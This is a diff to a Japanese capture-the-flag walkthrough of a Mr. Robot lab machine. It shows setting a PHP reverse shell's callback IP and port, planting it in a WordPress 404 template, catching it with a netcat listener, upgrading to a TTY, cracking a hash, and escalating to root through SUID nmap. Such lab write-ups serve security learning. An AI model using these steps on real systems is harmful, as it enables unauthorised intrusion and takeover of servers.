@@ -288,9 +288,92 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 17:50:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-14 17:53:41
 ```
 13.PHPのリバースシェルを設置する
-- gitから入手したリバースシェル使用
+- gitから入手したリバースシェル使用(Nortonにはじかれるので未記載)
   
 ```
-
+#４９行目と５０行目を変更
+$ip = '127.0.0.1';  // CHANGE THIS　⇒　$ip = '192.168.56.101'; 
+$port = 1234;      // CHANGE THIS　⇒　$port = 5555; 
 ```
-14.
+14.elliotでログインし、ダッシュボードでメニューの「Appearance」＞「Editor」＞「404 Template」を選択、バックアップをとる
+
+バックアップをとったら編集したphp-reverse-shell.phpをはりつける
+
+⇒　Update File を押す
+<img width="1398" height="808" alt="image" src="https://github.com/user-attachments/assets/04f8bc03-5c4d-4900-8f99-057497bae5d6" />
+
+※変更後
+<img width="1148" height="514" alt="image" src="https://github.com/user-attachments/assets/1b29bb3d-a814-41f6-b0d5-05df7ce0e125" />
+
+15.リバースシェルの待ち受け状態を作る
+
+`nc -nlvp 5555`
+
+16.リバースシェルのセッションを確立させる
+
+ブラウザでわざと404ページをよびだすのでもOK（今回はcurlを使う）
+
+`curl -X POST http://192.168.56.120:80//404.php`
+<img width="876" height="331" alt="image" src="https://github.com/user-attachments/assets/7d328179-eafc-4149-bcae-48ae28a672e4" />
+
+17.対話的シェルを奪取する
+
+　pythonのptyモジュールを用いてTTYシェルを奪取する
+```
+python -c "import pty; pty.spawn('/bin/bash')”
+```
+　<img width="857" height="88" alt="image" src="https://github.com/user-attachments/assets/6d8c7a5c-921a-4334-b8ab-ced27e9cfb03" />
+
+18.システム内を探索する
+
+robotユーザのパスワードハッシュを発見
+key-2-of-3.txtは今のユーザーに権限がないらしい
+<img width="892" height="679" alt="image" src="https://github.com/user-attachments/assets/e83cd43d-a258-455d-ac73-9b44a90489ab" />
+
+19.オンラインでハッシュ値をクラックする
+
+今回しようするのはCrackStation
+
+robot : abcdefghijklmnopqrstuvwxyz
+<img width="891" height="329" alt="image" src="https://github.com/user-attachments/assets/a4ca4f43-6bbe-482f-9e72-2c21adb21f66" />
+
+20. 別のユーザーに切り替える
+   ```bash
+    daemon@linux:/home/robot$ su robot
+    su robot
+    Password: abcdefghijklmnopqrstuvwxyz
+    
+    robot@linux:~$ ls
+    ls
+    key-2-of-3.txt	password.raw-md5
+    robot@linux:~$ cat key-2-of-3.txt
+    cat key-2-of-3.txt
+    822c73956184f694993bede3eb39f959`
+   ```
+
+21.SUIDファイルを検索する
+```bash
+robot@linux:~$ find / -type f -perm -u=s 2> /dev/null
+```
+<img width="872" height="586" alt="image" src="https://github.com/user-attachments/assets/dfcd867d-5c54-4f59-befc-078bbba7e82c" />
+
+21. SUIDファイルであるnmapを利用してrootユーザへの昇格を試みる
+
+```bash
+robot@linux:~$ nmap --interactive
+nmap> h　←　ヘルプ表示
+```
+！を先頭につけることでコマンド入力される
+```bash
+nmap> !id
+!id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+waiting to reap child : No child processes
+nmap> !sh
+!sh 
+#
+``` 
+昇格したら最後のカギを探す
+
+先頭に見えないゴミがあるときがあるのでCtrl＋Uしてからコマンド入力
+<img width="744" height="569" alt="image" src="https://github.com/user-attachments/assets/78cb7630-e8b5-460e-9c22-6315f7ef842c" />
